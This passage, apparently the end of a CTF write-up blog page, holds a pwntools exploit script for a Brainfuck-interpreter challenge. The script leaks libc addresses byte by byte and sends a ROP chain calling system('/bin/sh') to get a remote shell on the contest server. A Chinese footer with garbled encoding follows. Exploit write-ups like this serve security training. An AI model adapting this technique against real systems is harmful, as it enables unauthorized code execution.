</span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        else</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#2F798A"> 0</span><br><br><span style="color:#1E754F">    return</span><span style="color:#2F798A"> 0</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> depth </span><span style="color:#1E754F">else</span><span style="color:#393A34"> sp</span><br><span style="color:#A0ADA0">                #>,[[>],[&#x3C;]>-]-[>]-[&#x3C;.+]++++++++++.</span><br><span style="color:#393A34">official_code </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">>,[[>],[&#x3C;]>-]-[>]-[&#x3C;.+]++++++++++.</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">code </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">>,[[>],[&#x3C;]>-]-[>]-[&#x3C;.+][[->.,+]</span><span style="color:#B5695977">'</span><br><br><span style="color:#393A34">out </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> *</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">code</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">end </span><span style="color:#999999">=</span><span style="color:#393A34"> translate</span><span style="color:#2993a3">(</span><span style="color:#393A34">code</span><span style="color:#999999">,</span><span style="color:#393A34"> out</span><span style="color:#2993a3">)</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">x</span><span style="color:#a65e2b">)</span><span style="color:#1E754F"> for</span><span style="color:#393A34"> x </span><span style="color:#1E754F">in</span><span style="color:#393A34"> out</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># p = process(['./bf',official_code])</span><br><span style="color:#393A34">p </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">brain-a-tac.chals.damctf.xyz</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A">31337</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># gdb.attach(p,'go')</span><br><span style="color:#A0ADA0"># >&#x3C; ., +- []</span><br><span style="color:#A0ADA0"># 12 34 56 78</span><br><span style="color:#393A34">pay </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xff</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 7</span><br><span style="color:#393A34">pay </span><span style="color:#999999">+=</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">02020205</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">02020201</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">02020203</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">02020204</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">01010106</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">ffdd0208</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">pay </span><span style="color:#999999">+=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">'</span><span style="color:#AB5959">+</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">1</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">72</span><span style="color:#AB5959">-</span><span style="color:#2F798A">6</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xff</span><span style="color:#B5695977">'</span><br><span style="color:#A0ADA0"># for x in out:</span><br><span style="color:#A0ADA0">    # pay+=p32(x)</span><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">pay</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    s</span><span style="color:#2993a3">(</span><span style="color:#393A34">pay</span><span style="color:#1e754f">[</span><span style="color:#393A34">i</span><span style="color:#999999">:</span><span style="color:#393A34">i</span><span style="color:#AB5959">+</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># p.interactive()</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">2</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">25b</span><span style="color:#AB5959">+</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x87</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># p.interactive()</span><br><span style="color:#A0ADA0"># s(b'\x00'*0x7e+b'\xff')</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># s(b'\x00'*0x1b0+p32</span><br><span style="color:#A0ADA0"># (0)+b'\x87')</span><br><span style="color:#A0ADA0"># p.recvuntil(p64(2))</span><br><span style="color:#A0ADA0"># pause()</span><br><span style="color:#A0ADA0"># p.interactive()</span><br><span style="color:#A0ADA0"># p.close()</span><br><span style="color:#393A34">x </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xb8</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x3c</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libcbase </span><span style="color:#999999">=</span><span style="color:#393A34"> u8</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xb8</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">x </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libcbase </span><span style="color:#999999">+=</span><span style="color:#393A34"> u8</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 8</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">p8</span><span style="color:#1e754f">(</span><span style="color:#393A34">u8</span><span style="color:#a65e2b">(</span><span style="color:#393A34">x</span><span style="color:#a65e2b">)</span><span style="color:#AB5959">+</span><span style="color:#a65e2b">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">90</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">a3</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">x </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libcbase </span><span style="color:#999999">+=</span><span style="color:#393A34"> u8</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 16</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">p8</span><span style="color:#1e754f">(</span><span style="color:#393A34">u8</span><span style="color:#a65e2b">(</span><span style="color:#393A34">x</span><span style="color:#a65e2b">)</span><span style="color:#AB5959">+</span><span style="color:#a65e2b">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">11</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">2</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">x </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># #11903c</span><br><br><br><span style="color:#393A34">libcbase </span><span style="color:#999999">+=</span><span style="color:#393A34"> u8</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 24</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">x </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libcbase </span><span style="color:#999999">+=</span><span style="color:#393A34"> u8</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">x </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libcbase </span><span style="color:#999999">+=</span><span style="color:#393A34"> u8</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 40</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#AB5959">+</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00\x00</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libcbase </span><span style="color:#999999">=</span><span style="color:#393A34"> libcbase </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">2a3b8</span><br><span style="color:#393A34">rdi </span><span style="color:#999999">=</span><span style="color:#393A34"> libcbase </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">11903c</span><br><span style="color:#393A34">binsh </span><span style="color:#999999">=</span><span style="color:#393A34"> libcbase </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">/bin/sh</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#998418">__next__</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">saddr </span><span style="color:#999999">=</span><span style="color:#393A34"> libcbase </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">binsh</span><span style="color:#1e754f">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">rdi</span><span style="color:#AB5959">+</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">saddr</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#998418">hex</span><span style="color:#1e754f">(</span><span style="color:#393A34">libcbase</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># p.interactive()</span><br><span style="color:#A0ADA0"># pause()</span><br><span style="color:#393A34">s</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x01</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># >&#x3C; ., +- []</span><br><span style="color:#A0ADA0"># 12 34 56 78</span><br><span style="color:#A0ADA0"># >,</span><br><span style="color:#A0ADA0"># [</span><br><span style="color:#A0ADA0">#   [>]</span><br><span style="color:#A0ADA0">#   ,</span><br><span style="color:#A0ADA0">#   [&#x3C;]</span><br><span style="color:#A0ADA0">#   >-</span><br><span style="color:#A0ADA0"># ]</span><br><span style="color:#A0ADA0"># -</span><br><span style="color:#A0ADA0"># [>]</span><br><span style="color:#A0ADA0"># -</span><br><span style="color:#A0ADA0"># [&#x3C;.+]</span><br><span style="color:#A0ADA0"># ++++++++++.</span><br></code></pre></div></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">ä¿æŒè”ç³»</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">Â·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">Â·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>æœ¬ç«™åŸºäº
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
æ”¹é€ ï¼Œé™¤ç‰¹åˆ«è¯´æ˜å¤–å†…å®¹ä»¥ CC BY 4.0 åè®®å…±äº«ã€‚</p></span></div></footer></body></html>